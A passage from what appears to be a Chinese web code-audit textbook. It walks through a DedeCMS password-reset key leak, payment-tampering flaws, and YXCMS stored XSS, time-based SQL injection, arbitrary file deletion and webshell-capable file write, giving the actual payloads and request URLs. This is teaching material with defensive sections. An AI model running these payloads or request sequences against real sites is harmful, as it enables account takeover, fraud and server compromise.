   $sql = "UPDATE `#@__pwd_tmp` SET `pwd` = '$key',mailtime = '$mailtime' WHERE `mid` ='$mid';";//更新表#@__pwd_tmp数据
   if($db->ExecuteNoneQuery($sql))//执行sql语句
   {
     if($send == 'Y')
     {
       sendmail($mailto,$mailtitle,$mailbody,$headers);
       ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php');
     }
     **elseif($send == 'N')//****如果变量$send为N则将信息打印出来，信息包括验证码key
**     { return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;**key=".$randval**);}



（2） 执行流程

重置用户密码正确流程是：member/resetpassword.php文件获取密码部分，从__pwd_tmp表中进行查询。程序进行加载模板，让用户填写密码，填写完密码以后会进入重置密码过程中，这部分会比对用户传输的临时key和数据库存储的pwd是否一致，如果一致则会成功修改密码。

图11-23为该CMS利用流程，首先通过发送请求/member/resetpassword.php?id=2&safequestion=0.0&safeanswer=&dopost=safequestion。调用newmail函数中的UPDATE流程，回显验证码key为CkeL9Uze。然后执行重置密码第二步，将该验证码进行校验并进行密码重置。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image550.jpg)

图11-23 漏洞利用流程图

（3） 利用阶段

首先访问http://IP，注册两个新用户target和attacker，其中target为目标用户，attacker为攻击用户。注意：为了模拟漏洞，注册target用户时，不要设置安全问题。以attacker用户身份访问路径为：http://ip/member/resetpassword.php?id=2&safequestion=0.0&safeanswer=&dopost=safequestion

使用BurpSuite抓取到上述请求的数据包，如图11-24所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image552.jpg)

图11-24 请求数据包图

然后转发该数据包将泄漏的验证码进行提取，如图11-25所示，验证码为CkeL9Uze。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image554.gif)

图11-25 泄露验证码图

登录target用户，访问链接为：http://ip/member/resetpassword.php?id=2&key=CKeL9Uze&dopost=getpasswd。（key字段的值应与实际抓到的响应包中的字段值相一致），跨越重置密码流程第一步，直接成功进入target用户重置密码过程第二步，直接通过页面重置密码，如图11-26所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image556.jpg)

图11-26 重置密码图

## 11.3 交易支付功能漏洞

### 11.3.1 交易支付功能漏洞介绍

支付漏洞一般出现在电商网站、在线交易平台等，其中将涉及在线支付的流程，而支付功能也有很多逻辑。如果逻辑设计不当，则可能导致0元购买商品等严重漏洞。交易支付的安全问题经常出现在购物网站、金融网站、保险网站、积分商城中。下面给出交易支付过程中易出现安全问题的流程如图11-27所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image558.jpg)

图11-27 支付安全问题图

常见的交易流程为：

l 商户平台交易订单校验

电商等商户平台的用户将交易表单提交到服务器中，服务器必须对订单信息进行计算校验，包括：商品金额、数量、商品信息、用户身份、session中的信息等等。

l 支付请求订单签名流程

商户平台将支付请求信息提交给支付平台时，需要同时带上签名信息，该信息用于支付平台约定的商户密钥串及签名算法对订单进行签名，例如：md5（订单id+金额+商户id+商品id+密钥串）。

l 支付结果验证签名

商户平台接收到支付平台请求后，要对支付结果的签名进行验签，从而避免被伪造支付结果。

### 11.3.2 交易支付功能漏洞挖掘

交易支付功能漏洞通常需根据Web程序的实际功能点进行审计，通过对此类敏感功能点进行审计从而挖掘支付漏洞。易出现支付安全问题的功能点包括：站点逻辑问题导致的支付漏洞、商品价格本身出现问题、第三方支付出现问题。

正向追踪变量传递过程，从而确定参数传递过程中是否存在更改或控制参数的情况。易出现安全问题的参数包括：价格、优惠券价格、折扣、积分抵扣、物品数量等。

### 11.3.3 交易支付功能常见安全问题

（1）   修改支付价格

常见的网站支付模块在购买商品过程中主要包括：订购、确认信息、付款。上述三个步骤中的任意一个步骤都可能存在修改价格的漏洞。网站开发过程中，开发人员为了方便，会直接在支付的关键步骤数据包中直接传递需要支付的金额。而这种金额后端没有做校验，传递过程中也没有做签名，导致可以随意篡改金额提交。审计人员只需要抓包找到有金额的参数修改成任意值即可。

例如：假设前面两步有验证机制，那么攻击者可在最后一步（即付款）时，进行抓包尝试修改金额，其修改的金额值可以尝试小数目或者尝试负数。图11-28为某网站的微信支付漏洞案例。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image560.jpg)

图11-28 支付漏洞案例图

使用BurpSuite对支付数据包进行拦截，检查支付的数据包如图11-29所示，将支付的值从10修改为0.01。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image562.jpg)

图11-29 修改价格数据包图

（2）   修改支付状态

该漏洞可通过修改订单支付状态从而达到支付功能绕过的情况。此类漏洞问题在于未对支付状态的值跟实际订单支付状态进行校验，导致点击支付时抓包修改支付状态，从而达到支付成功。

例如：某网站中A订单的状态为“完成支付”，B订单的状态为“未完成支付”。付款时通过抓包的方式将B订单的单号修改为订单A的单号，从而将B订单状态修改为“完成支付”。下面给出某旅游网站的订单修改案例，该网站通过“修改订单”功能将URL链接进行拦截，如图11-30所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image564.jpg)

图11-30 修改订单图

其URL路径为：http://ip/WDHandler/LineOrder.php?action=updateLine&PlatFORM=net&**lineid=4593689**&b2bMemberId=207967&**TotalPrice=2750.00**&TotalMan=1&TotalChild=0&b2cname=13111112343&b2......

该URL可以在不登录的情况下更新订单，通过更改上述URL里面的两个参数，分别是：lineid、totalprice可以直接修改订单价格，如图11-31所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image566.jpg)

图11-31 修改订单价格图

（3）   修改购买数量

网站的支付过程中，通过将商品的数量修改为负数，从而修改订单金额为负数，导致绕过支付功能。这种案例比较常见，产生的原因是开发人员没有对购买的数量参数进行严格的限制。这种同样是由于数量参数没有做签名，导致可随意修改，常用的修改方式是改成负数。当购买的数量是一个负数时，总额的算法仍然是"购买数量x单价=总价"。所以这样就会导致负数支付金额。若支付成功，则可能导致购买了一个负数数量的产品，也有可能返还相应的积分到账户上。

例如：某旅游网站的修改购买数量漏洞案例，该网站通过修改订单数中预定人数为-1，小孩人数为正数从而提交订单成功，导致支付金额存在问题。图11-32为订单截图，其中成人数为-1，儿童数为2。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image568.gif)

图11-32订单截图

（4）   修改附属值

在购买商品时可以使用积分或优惠劵等进行代替金额付款，很多的安全支付问题都出现在该功能上，一般将此类漏洞归类为通过修改附属值引起的安全问题，其主要包括：

l 修改优惠劵金额

l 修改优惠劵金额及业务逻辑问题

l 修改积分金额

（5）   修改支付接口

某些网站支持很多种支付，比如自己支付工具、支付宝、微信等，同时，每个支付接口值都不一样。如果该网站逻辑功能设计不当，当攻击者随便选择一个接口点击支付时进行抓包，然后修改其支付接口为一个不存在的接口，如果该网站未做好不存在接口相关处理，那么此时就会支付成功的情况。

（6）   其他支付问题

l 越权支付

在支付当中会出现当前用户的ID，比如：username=XXXXX，如果没有加以验证，其支付也是一次性支付没有要求输入密码什么的机制，那么就可以修改这个用户ID为其它用户ID，达到用其他用户的账号进行支付商品。

l 无限制试用

网站中的一些商品，例如：云计算系列产品支持试用，试用时期一般为7天或者30天，一个账户只能试用一次，试用期过后将不能继续使用。攻击者可以通过修改试用的参数从而造成无限期试用。

### 11.3.4 交易支付功能防御方法

  下面给出交易支付功能的防御方法：

l 后端检查每一项参数值。Web程序的在交易流程中，需要对交易过程的每项参数进行检查，包括：支付金额、交易数量、交易状态，保证产品数量只能为正整数、限制购买数量等。

l 与第三方支付平台检查，实际支付的金额是否与订单金额一致。

l 支付参数进行md5加密、解密、数字签名及验证，可以有效的避免数据修改，重放攻击中的各种问题。

l 金额超过阈值，进行人工审核。

## 11.4 单元小结

本单元主要学习了代码审计中的业务功能漏洞进行审计，对业务功能漏洞中的主要功能：验证码功能、密码重置功能、交易支付功能进行着重介绍，使读者熟悉常见的业务功能漏洞审计。给出nbcms与dedecms存在的业务功能漏洞进行实践，从而对本单元内容进一步理解。



 

# 单元12 YXCMS审计

本单元将对一个CMS系统进行较为完整的审计，其分为四部分进行介绍。

第一部分介绍CMS审计的准备工作：页面功能分析、CMS目录结构分析、路由情况分析、过滤函数了解。只有对这上述工作准备充分才能更熟练的分析CMS

第二部分介绍YXCMS中留言板功能中存在的存储型XSS漏洞的分析利用。

第三部分介绍YXCMS中碎片管理功能中存在的SQL注入漏洞的分析利用。

第四部分介绍YXCMS中存在的任意文件操作漏洞分析与利用。

**单元构图：**

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image570.jpg)**

**单元目标：**

\1.  了解CMS完整的审计流程；

\2.  掌握CMS审计的准备工作；

\3.  熟悉常见漏洞的审计方法。

## 12.1  审计前准备

在对CMS进行代码审计前，通常需要使用通读全文法对CMS的整体框架有所了解。审计的准备公祖哦包括：页面功能分析、目录结构分析、路由情况分析、过滤函数入口函数分析。

1.前台页面功能进行分析

搭建网站结束后，用户可访问前台页面对该CMS的功能进行了解，页面如图12-1所示。针对不同的功能点推测可能存在安全漏洞的功能点。

下面对该页面安全问题进行列举：

l 用户注册功能、用户登录功能：是否存在SQL注入漏洞。

l 用户忘记密码功能：是否存在业务逻辑功能漏洞。

l 留言本功能：是否存在存储型XSS漏洞或SQL注入。

l 搜索框功能：是否存在反射型XSS漏洞或SQL注入。

l 点击模板功能：请求链接可能存在SQL注入，链接如下：

http://ip/index.php?r=default/column/content&col=demoshow&id=6

l 支付功能：是否存在支付逻辑漏洞。

一般情况下，功能点越多存在的漏洞可能性越大，从前台功能审计只能对基本漏洞进行推测，而实际分析仍需要黑盒与白盒相结合才能能快速的挖掘漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image572.jpg)

图12-1 YXCMS前台页面图

2．后台页面功能进行分析

由于该CMS存在后台管理员程序，因此还需要对该页面功能进行安全漏洞分析，页面如图12-2所示。在很多CMS中由于管理员功能较多、权限较高，导致其安全漏洞也相较于前台页面更多，下面对其可能存在安全漏洞的功能进行列举：

l 后台填写的所有表单：均有可能存在XSS漏洞。

l SQL执行功能、数据库备份：可能存在命令执行漏洞。

l 模板管理功能：可能存在任意文件删除、任意文件上传漏洞。

其他漏洞包括：SSRF、XXE、文件包含、反序列化等漏洞无法从页面功能发现推测。需要对后台代码进行全局搜索危险函数，或使用审计工具扫描分析漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image574.jpg)

图12-2 YXCMS后台页面图

  3.CMS目录结构分析

经过分析可知YXCMS目录结构如表12-1所示。

表12-1 YXCMS文件目录结构

| **文件名**   | **文件作用**     | **文件属性**    | **文件作用**       |
| ------------ | ---------------- | --------------- | ------------------ |
| data文件夹   | 存放备份数据     | protected文件夹 | 网站程序核心文件夹 |
| public文件夹 | 存放模板公用文件 | upload文件夹    | 存放上传文件       |
| index.php    | 网站入口文件     |                 |                    |

需要对proctected文件夹下的结构进行分析，其结构如表12-2所示。

表12-2 proctected文件目录结构

| **文件名**                        | **文件作用**     |
| --------------------------------- | ---------------- |
| protected/apps/admin              | 管理员后台应用   |
| protected/apps/default            | 前台功能应用     |
| protected/apps/member             | 会员中心入口文件 |
| protected/apps/install            | 系统安装         |
| protected/apps/appmanage          | 应用管理         |
| protected/apps/default/controller | 控制器           |
| protected/apps/default/model      | 模型             |
| protected/apps/default/view       | 界面             |
| protected/config.php              | 系统全局配置     |
| protected/core.php                | 系统核心函数     |

至此，分析该CMS的功能主要包括：管理员、前台、会员中心、应用管理等功能，每个功能分别对应protected/apps下的一个文件夹。同时，每个功能文件夹下都包含：控制层（controller）、模型层（model）、界面层（view）。上述三层是Web应用开发中常用的结构（MVC模型结构）。

MVC模型结构分别控制着网站的应用功能，其包括：Model、Controller、View。

l Model（模型）：模型层，定义该应用中的类文件。

l Controller（控制）：控制层，负责业务逻辑并把页面展示给用户；

l View（视图）：视图层，负责在适当的时候调用Model和Controller；

4.路由情况分析

在进行代码审计前需要了解每个CMS的路由情况，即程序是如何从网站的URL传递至后台代码。只有对网站的路由情况熟悉才能熟练的分析CMS的漏洞与漏洞利用链。

YXCMS网站中后台管理员URL为：

http://127.0.0.1/YXCMS/index.php?r=admin/index/index#

该网站将访问index.php文件，该文件中包含了protected/core.php文件，因此在文件core.php中查看路由情况，其核心路由代码如下：



function urlRoute(){

  $rewrite = config('REWRITE');   //调用config方法返回$rewrite变量

//如果$rewrite不为空则对请求进行处理

  if( !empty($rewrite) ) {

​    if( ($pos = strpos( $_SERVER['REQUEST_URI'], '?' )) !== false ){

​      parse_str( substr( $_SERVER['REQUEST_URI'], $pos + 1 ), $_GET );}

​    foreach($rewrite as $rule => $mapper){...省略...}

​    if(empty($_REQUEST['r']) && trim($_SERVER["REQUEST_URI"],'/')) $_REQUEST['nor']=true;}

**//将请求r参数根据/进行分隔为数组**

  **$route_arr** **= isset($_REQUEST['r']) ? explode("/", htmlspecialchars($_REQUEST['r'])) : array();** 

//根据分隔的数组获得$app_name、$controller_name、$action_name

  **$app_name** = empty(**$route_arr[0]**) ? DEFAULT_APP : strtolower($route_arr[0]);

  **$controller_name** = empty(**$route_arr[1]**) ? DEFAULT_CONTROLLER : strtolower($route_arr[1]);

  **$action_name** = empty(**$route_arr[2]**) ? DEFAULT_ACTION : $route_arr[2];

  $_REQUEST['r'] = $app_name .'/'. $controller_name .'/'. strtolower($action_name);

//定义变量

  **define('APP_NAME', $app_name);**

  **define('CONTROLLER_NAME', $controller_name);**

  **define('ACTION_NAME', $action_name);}**



上述代码核心功能是对请求按照斜杠/进行分隔，然后将分隔后的参数值定义为不同的变量。

例如：“http://127.0.0.1/YXCMS/index.php?r=admin/index/index#”，r参数将被分隔为“admin”、“index”、“index”三个参数，而这三个参数分别对应“APP_NAME”、“CONTROLLER_NAME”、“ACTION_NAME”。该请求代表调用了indexController.php的index方法，如图12-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image576.jpg)

图12-3 路由分析图

经过分析得出该CMS通过URL路径中的r参数进行分隔并发送到指定的Controller层调用方法。

5.CMS过滤函数了解

通过对该CMS的通用文件protected\include\lib\common.function.php进行了解，发现该文件下函数都为过滤函数，其中过滤函数如表12-3所示。这些过滤函数通常在分析参数过滤漏洞时起到关键作用。

表12-3 proctected文件目录结构

| **函数名**            | **函数作用**                                                 |
| --------------------- | ------------------------------------------------------------ |
| in函数                | 用来过滤字符串和字符串数组，防止被挂马和SQL注入  参数$data，待过滤的字符串或字符串数组， |
| out函数               | 用来还原字符串和字符串数组，把已经转义的字符还原回来         |
| text_in与text_out函数 | 文本输入输出过滤                                             |
| removeXSS函数         | 防御XSS漏洞函数                                              |
| html_in与html_out函数 | html代码输入与输出过滤                                       |
| `deletehtml函数`      | `去除html和js标签`                                           |
| get_client_ip函数     | 获取客户端IP地址                                             |

## 12.2 留言板存储型XSS分析

当访问http://ip/YXCMS/index.php?r=default/column/index&col=guestbook时，将进入系统的留言板界面。判断该功能是否存在XSS漏洞需要进行如下分析：

l 数据存储流程与过滤情况分析；

l 前台页面显示数据分析。

1.数据存储流程分析

根据上文该CMS的路由分析可知，该请求将被路由文件protected\apps\default\controller\columnController.php的index方法，其部分代码如图12-4所示。其流程使用“switch/case”语句根据变量$sortinfo的type属性判断调用哪个函数，在PHP代码中添加代码“var_dump($sortinfo);”后，刷新页面显示该变量类型为6，因此调用extend函数。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image578.jpg)

图12-4 index方法代码图

extend函数将判断该传递的参数$tableinfo[$i][‘tableinfo’]（经过分析可知该参数为POST传递的tname变量）是否为数组，如果不是数组则调用html_in函数进行过滤，若是数组则调用deletehtml函数和in函数进行过滤。通过分析可知html_in函数由于过滤严格无法绕过，而deletehtml与in函数可以进行绕过，其代码如图12-5所示。（数据存储至数据库的代码、过滤函数代码省略）

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image580.jpg)

图12-5 extend方法代码图

  绕过上述过滤函数的Payload为

tname[]=**an<script%26gt;alert(1)</script%26gt;**&tel=15600106593&qq=asdf&content=asdfasdf&checkcode=4341&__hash__=2593aa0f02fcdb094b61ef7d6d733bfb_5dbch3bCiC8X5V%2BsgijPcxEIiTmMoz9Vjvg5SsSyCDscGbRJiFQus7Y

2.前台页面显示数据分析。

在管理员后台的留言本中，可以对上文提交的留言进行审核。需要对该程序显示数据的流程进行分析。通过BurpSuite抓包可知该请求为http://ip/YXCMS/index.php?r=admin/extendfield/meslist&id=12其对应文件为extendfieldController.php的meslist方法。该方法未经过任何过滤将内容直接打印至页面中。

3.漏洞测试

使用BurpSuite拦截提交留言的数据包，并修改为上述的Payload提交后，登录管理员后台，点击“留言本”出现弹框功能，如图12-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image582.jpg)

图12-6存储型XSS效果图

## 12.3 碎片管理SQL注入分析

该CMS的碎片管理功能处存在无单引号保护的SQL注入漏洞。管理员登录后台将进入碎片管理界面，对碎片进行删除操作，如图12-7所示。通过使用BurpSuite拦截数据包发现该请求链接为http://ip/YXCMS/index.php?r=admin/fragment/del。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image584.jpg)

图12-7 SQL注入操作图

1.数据存储流程分析

审计该HTTP请求是否存在SQL注入漏洞，文件fragmentController.php中的index方法代码如下：



  public function del()

  {

​    if(!$this->isPost()){         //若不是POST方法则调用以下流程

​      $id=intval($_GET['id']);

​      if(empty($id)) $this->error('您没有选择~');

​      if(model('fragment')->**delete("id='$id'")) //****有单引号保护**

​      else echo '删除失败~';

​    }else{                 //若是POST方法则调用以下流程

​      if(empty($_POST['delid'])) $this->error('您没有选择~');

​      $delid=implode(','**,$_POST['delid']);//****参数delid用逗号连接**

​      **if(model('fragment')->delete('id in ('.$delid.')'))//****未单引号保护**

​      $this->success('删除成功',url('fragment/index'));

​    }}



上述代码流程分析：

l 判断HTTP请求是否为POST方法。

l 若为POST方法则将参数$delid调用delete方法执行删除操作，值得注意的是上述代码传递字符串'id in ('.$delid.')'，参数$delid未经过双引号保护，可能存在SQL注入漏洞。

通过审计删除碎片过程中，参数$delid的传递过程，如图12-8所示。参数$delid最终经过传递，使用real_escape_string进行过滤，同时该参数未使用引号进行保护。因此可通过$delid形成SQL注入漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image586.jpg)

图12-8 参数$delid传递流程图

2．漏洞测试

SQL执行语句核心代码在文件protected\include\core\cpModel.class.php处的delete方法，其代码如下：



  public function delete() {

​    $table = $this->options['table'];  //当前表

​    **$where = $this->_parseCondition();** //条件

​    if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除

**//前面代码声明$table为yx_fragment，$where为WHERE id in ($delid)**

​    $this->sql = **"DELETE FROM $table $where";** 

​    $query = $this->db->execute($this->sql);

​    var_dump($this->sql);//小技巧：使用var_dump查看执行的SQL语句

​    return $this->db->affectedRows();}



经过分析可知最终构造的SQL语句为“DELETE FROM yx_fragment WHERE id in ($delid)”。若构造payload为“1) or if(sleep(3),1,1”完成时间盲注，最终可以拼接的SQL语句为“DELETE FROM yx_fragment WHERE id in (1) or if(sleep(3),1,1)”。执行Payload若等待了3秒说明存在SQL注入漏洞，其使用BurpSuite发送数据包，如图12-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image588.jpg)

图12-9 BurpSuite的SQL注入图

## 12.4 任意文件操作漏洞分析

任意文件操作漏洞的挖掘通常是对代码进行全局搜索危险函数，而该CMS中存在任意文件删除和任意文件写入漏洞，本小节将对这两个漏洞进行分析。

### 12.4.1 YMCMS任意文件删除

该功能点存在于后台管理页面，当用户点击“上传文件管理”标签时，传递的文件名参数未经过过滤，导致可以删除install.lock文件造成以系统的重装漏洞（重装漏洞是由于删除了系统的lock文件导致该CMS可以被攻击者重新安装的漏洞）。

存在任意文件删除的请求链接为：“http://ip/YXCMS/index.php?r=admin/files/del&fname=%2CNoPic.gif”。该链接触发的文件是protected\apps\admin\controller\filesController.php中的del方法，其代码如下：



  public function del()

  {

​    $dirs=in($_GET['fname']);      //通过fname获取文件名

​    $dirs=str_replace(',','/',$dirs);  //将，替换为/

​    $dirs=ROOT_PATH.'upload'.$dirs;   //拼接文件路径为upload文件夹下文件

​    if(is_dir($dirs)){del_dir($dirs); echo 1;} //判断是否为文件夹并删除

​    elseif(file_exists($dirs)){        //判断是否为文件并删除

​      if(unlink($dirs)) echo 1;

​    }else echo '文件不存在'; }



上述代码文件未对参数fname进行过滤，从而导致可以删除该系统任意文件，以upload文件夹下test.txt文件为例，使用BurpSuite拦截删除请求并修改后的效果如图12-10所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image590.jpg)

图12-10 BurpSuite删除任意文件效果图

### 12.4.2 YMCMS任意文件写入

该功能点存在于后台管理页面，当用户点击“前台模板管理”->“管理模板文件”->“新建”标签时，可以向服务器写入PHP文件。通过该功能可写入木马文件从而进行远程连接。

存在任意文件删除的请求链接为：“http://ip/YXCMS/index.php?r=admin/set/tpadd&Mname=default”。该链接触发的文件是protected\apps\admin\controller\setController.php中的tpadd方法，其代码如下：



  public function tpadd()

  {

​    $tpfile=$_GET['Mname'];  //传递值为default

​    if(empty($tpfile)) $this->error('非法操作~');

**//值为apps/default/view/default**

​    **$templepath=BASE_PATH . $this->tpath.$tpfile.'/';** 

​    if($this->isPost()){

​      **$filename=trim($_POST['filename']);**

​      $code=stripcslashes($_POST['code']);

​      if(empty($filename)||empty($code)) $this->error('文件名内容不能为空');

​     **$filepath=$templepath.$filename.'.php';**

​     if($this->**ifillegal($filepath)**) {$this->error('非法文件路径~');exit;}

​     try{**file_put_contents($filepath, $code);**

​     } catch(Exception $e) {$this->error('模板文件创建失败！');}  

​     $this->success('模板成功',url('set/tplist',array('Mname'=>$tpfile)));

​    }else{

​      $this->tpfile=$tpfile;

​      $this->display();}}



上述代码流程：

l 根据传递的Mname参数拼接文件存储路径$templepath值为apps/default/view/default。

l 获取文件名$filename并判断是否为空。

l 拼接存储文件为$filepath=$templepath.$filename.'.php'。

l 判断$filepath是否符合过滤函数ifillegal要求（该过滤函数要求不能包含./和\\和/view/，防御目录遍历漏洞）。

l 调用file_put_contents函数上传文件。

程序在上传文件过程中，并未对文件内容及文件名进行过滤，从而导致用户可以上传任意文件至服务器，图12-11为使用上传木马文件示意图。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image592.jpg)

图12-11 任意文件写入效果图

## 12.5 单元小结

  本单元通过对YXCMS V1.4.7进行审计，让读者了解完整CMS的审计流程。其中代码审计的准备工作尤为重要，然后对该CMS中不同的功能点漏洞进行代码分析，包括：存储型XSS漏洞、SQL注入漏洞、任意文件操作漏洞。



 

# 单元13 Java代码审计

与PHP代码审计相比，Java代码比PHP代码要更加复杂， Java EE代码审计要求测试人员对Java代码具有很强的走读能力。本单元将详解介绍Java代码审计中的几个常见漏洞，包括：SQL注入漏洞、XSS漏洞、命令执行漏洞、文件操作漏洞，其主要分为两个部分进行介绍。

第一部分介绍Java代码审计的基础知识，包括：Java EE中基本知识、Java代码审计基础，包括：Java环境配置、Tomcat安装、Java EE项目部署等。

第二部分介绍Java代码审计中的常见漏洞案例，包括：SQL注入漏洞的Java审计与防御、XSS漏洞审计与防御，命令执行漏洞、文件操作漏洞。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image594.jpg)

**单元目标：**

\1.  了解Java EE的基础知识；

\2.  掌握Java代码走读；

\3.  熟悉Java代码中常见漏洞的审计技巧。

## 13.1 Java代码审计入门

### 13.1.1 Java EE介绍

Java EE是一套Java程序与其他程序或应用进行交互的一套规范，它是Sun公司为企业级应用推出的标准平台，用来开发浏览器/服务器（B/S）框架软件，其可以认为是一个框架，也可以认为是一种规范。Java EE包含的核心技术有：JDBC、JNDI、Servlet、JSP等。

l JDBC（数据库连接技术）

由Java语言中用来规范客户端程序访问数据库的应用程序接口，该技术的连接步骤为：

  注册相关数据库的驱动,也就是将相关数据库厂商实现的Driver加载到JVM中；

  获取数据库连接对象Connection；

  获取传输器对象Statement；

  编写/得到sql语句,执行sql语句,得到结果集对象ResultSet；

  处理结果Result.next()；

  释放资源。

l JNDI（Java命名和目录接口）

JNDI是 Java 的一个目录服务应用程序界面，它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。简而言之，JNDI可以用配置文件存放数据，从而解决了代码间的参数耦合。配置文件可以使xml、properties、yml等形式进行解析，例如：Spring框架的配置文件为application.yml。

Spring框架配置文件文件application.yml的JDBC JNDI如下：



spring:

 datasource:

  driver-class-name: com.mysql.jdbc.Driver     #数据库驱动名称

  url:                       #数据库url

jdbc:mysql://localhost:3306/jmccms?useUnicode=true&characterEncoding=utf8&allowMultiQueries=true&serverTimezone=GMT%2B8&useSSL=false

  username: root                  #数据库访问账户

  password: root                  #数据库访问密码



l Servlet

Servlet是用Java编写的服务器端程序。其主要功能在于交互地浏览和修改数据，生成动态Web内容。程序中的Servlet类会通过继承父类HttpServelt，从而重写了HTTP的GET方法，并对其进行相应处理。下面案例给出了处理请求http://ip/test的Servlet类代码：



@WebServlet("/test")                //处理请求为http://ip/test

public class Servlet extends **HttpServlet** { //定义Servelt类实现HttpServlet接口

  @Override

  protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

​    request.setCharacterEncoding("utf-8");

  }

public void **doGet**(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {              //客户端get请求

if((username != null)&&(username.trim().equals("jsp"))) {
 　　　if((pwd != null)&&(pwd.trim().equals("1"))) {
 　　　　　session.setAttribute("account", account);
 　　　　　String login_suc = "success.jsp";

**//如果用户名密码正确则跳转到success.jsp页面**
 　　　　　**resp.sendRedirect(login_suc); 
** 　　　　　　　return;
 　　　　　}}}

…省略…

}



l JSP

JSP是由Sun公司主导创建的一种动态网页技术标准，它其实是Servlet的一种特殊形式。JSP部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成HTML、XML或其他格式文档的Web网页，然后返回给请求者。

### 13.1.2 Java代码审计基础

（1）   安装与配置Java环境变量

安装与配置Java环境是进行程序开发、代码审计的准备工作。需要从官网下载JDK安装包（Java标准开发包），用户需根据个人计算机的系统版本选择安装。为了让计算机连接到Java的安装路径，需要对该计算机配置相应的环境变量，用户通过点击“我的电脑”->“属性”->“高级系统设置”->“环境变量”进行配置。如图13-1所示。配置的环境变量参数包括：JAVA_HOME、PATH、CLASSPATH。

![http://www.runoob.com/wp-content/uploads/2013/12/java-win2.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image596.jpg)

图13-1 环境变量图

（2）   Java服务器——Tomcat

常见的Java服务器：Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere等。

Tomcat服务器是一个免费开源的Web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问等很多的场合下被普遍使用。同时，它也是开发和调试JSP程序的首选。Tomcat安装包可以从Apache官网进行下载，解压后其目录结构如表13-1所示。

表13-1 目录结构表

| **目录** | **说明**                                             |
| -------- | ---------------------------------------------------- |
| /bin     | 存放各种平台下用于启动和停止Tomcat的命令文件         |
| /conf    | 存放tomcat的配置文件                                 |
| /lib     | 存放tomcat服务器所需的各种JAR文件                    |
| /logs    | 存在tomcat的日志文件                                 |
| /temp    | tomcat运行时用于存放临时文件                         |
| /webapps | 当发布web应用时，默认会将Web应用的文件发布到此目录中 |
| /work    | tomcat把由JSP生产的Servlet放于此目录下               |

在部署Web应用过程中，一般要将Web程序部署到/webapps目录下，通过运行Tomcat的/bin/startup脚本从而启动tomcat服务器，然后通过浏览器访问http://localhost:8080访问tomcat首页，如图13-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image598.jpg)

图13-2 Tomcat首页图

（3）   JSP动态网站搭建

图13-3为JSP动态网站开发流程，其主要介绍了搭建JSP的详细方法，其主要包括：

l 通过IDEA创建maven项目。

l 在pom.xml文件（Maven项目的版本控制文件）中添加依赖，使其支持Servlet处理。

l 新建LoginServlet.java文件（获取请求参数并进行业务处理操作）。

l 在web.xml文件中添加Servlet、JSP页面用于请求（将上述创建的java文件与请求路径进行映射）。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image600.jpg)

图13-3 JSP动态网站开发流程图

通过IDEA创建Maven项目，并在pom.xml文件中添加servelt、JSP、JSTL的依赖。添加的内容如下：



<!—Servlet依赖 -->

​    <dependency>

​      <groupId>javax.servlet</groupId>

​      <artifactId>javax.servlet-api</artifactId>

​      <version>3.1.0</version>

​      <scope>provided</scope>

​    </dependency>

​    <!-- JSP依赖-->

​    <dependency>

​      <groupId>javax.servlet.jsp</groupId>

​      <artifactId>jsp-api</artifactId>

​      <version>2.2</version>

​      <scope>provided</scope>

​    </dependency>

​    <!-- JSTL依赖-->

​    <dependency>

​      <groupId>javax.servlet</groupId>

​      <artifactId>jstl</artifactId>

​      <version>1.2</version>

​      <scope>runtime</scope>

​    </dependency>



